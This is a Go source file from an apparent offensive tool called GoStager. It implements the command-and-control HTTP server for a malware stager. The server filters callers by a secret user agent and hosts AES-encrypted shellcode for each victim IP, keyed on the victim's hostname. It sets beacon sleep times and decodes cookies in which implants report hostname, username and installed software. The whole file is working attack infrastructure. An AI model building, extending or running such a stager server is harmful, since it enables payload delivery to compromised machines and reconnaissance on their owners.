package http

import (
	"GoStager/config"
	"GoStager/util"
	b64 "encoding/base64"
	"errors"
	"fmt"
	color "github.com/logrusorgru/aurora"
	"net/http"
	"strings"
)

var (
	Target []string
	misc   util.InitChecks
	userA  string
	m      map[string][]byte
)

func CreateHttpServer(conf config.General) {
	m = map[string][]byte{"all targets": []byte(fmt.Sprintf("%d", conf.GetSleep()))}
	address := fmt.Sprintf("%s:%d", conf.GetHost(), conf.GetPort())
	userA = conf.GetUserAgent()
	fmt.Printf("%s %s\n\n", color.Green("[+] Started http server on"), color.Yellow(address))
	http.HandleFunc(conf.Conf.EndPoint, logRequest)
	err := http.ListenAndServe(address, nil)
	if err != nil {
		util.ErrPrint(err)
		return
	}
}

// HostShellcode Hosts the shellcode
func HostShellcode(path string, ip string) error {
	var err error
	if misc.Hostname == "" {
		return errors.New("wait for the implant to call back")
	}
	key := util.GenerateKey(misc.Hostname, 32)
	shellcode, err := util.ScToAES(path, key)
	m[ip] = shellcode
	fmt.Println(color.Green("[+] Shellcode hosted for " + ip))
	if err != nil {
		return err
	}
	return error(nil)
}

func HostSleep(t int, ip string) {
	m[ip] = []byte(fmt.Sprintf("%d", t))
	fmt.Printf("%s %d%s %s%s\n", color.Green("[+] Sleep time set to"), color.Yellow(t), color.Yellow("s"), color.Green("on "), color.Yellow(ip))
}

// Logs the requests from the beacons
func logRequest(w http.ResponseWriter, r *http.Request) {
	userAgent := r.UserAgent()
	if userAgent != userA {
		w.WriteHeader(404)
		fmt.Printf("\n%s\n", color.Yellow("[!] Unauthorized user agent: "+userAgent))
		return
	}
	addr := strings.Split(r.RemoteAddr, ":")
	if len(m) == 1 {
		_, err := w.Write(m["all targets"])
		if err != nil {
			return
		}
	} else {
		_, err := w.Write(m[addr[0]])
		if err != nil {
			return
		}
	}
	if util.Contains(Target, addr[0]) {
		return
	} else {
		Target = append(Target, addr[0])
		fmt.Printf("\n%s %s\n", color.Green("[+] Request from:"), color.Yellow(addr[0]))
		fmt.Printf("%s %s\n", color.Green("[+] User-Agent:"), color.Yellow(r.UserAgent()))
		cookie := r.Header.Get("Cookie")
		if cookie != "" {
			out, err := b64.StdEncoding.DecodeString(cookie)
			misc = util.UnmarshalJSON(out)
			if err != nil {
				fmt.Println(color.Red("[!] Error decoding cookie"))
			}
			printCookie(out)
		}
	}
}

func printCookie(cookie []byte) {
	j := util.UnmarshalJSON(cookie)
	fmt.Printf("%s %s\n", color.Green("[+] Hostname:"), color.Yellow(j.Hostname))
	fmt.Printf("%s %s\n", color.Green("[+] Username:"), color.Yellow(j.Username))
	fmt.Print(color.Green("[+] Installed software : "))
	for x := range j.Dir {
		if x == len(j.Dir)-1 {
			fmt.Printf("%v\n", color.Yellow(j.Dir[x]))
		} else {
			fmt.Printf("%v, ", color.Yellow(j.Dir[x]))
		}
	}
}
